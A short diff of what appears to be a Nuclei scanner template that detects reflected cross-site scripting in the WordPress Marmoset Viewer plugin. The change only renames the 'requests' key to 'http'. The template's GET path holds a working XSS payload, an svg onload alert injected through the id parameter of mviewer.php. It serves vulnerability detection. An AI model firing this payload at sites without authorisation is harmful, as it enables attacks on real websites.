@@ -7,7 +7,7 @@ info:
   tags: wordpress,xss
   reference: https://wordpress.org/plugins/marmoset-viewer/#developers
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/wp-content/plugins/marmoset-viewer/mviewer.php?id=http://</script><svg/onload=alert(%27{{randstr}}%27)>"
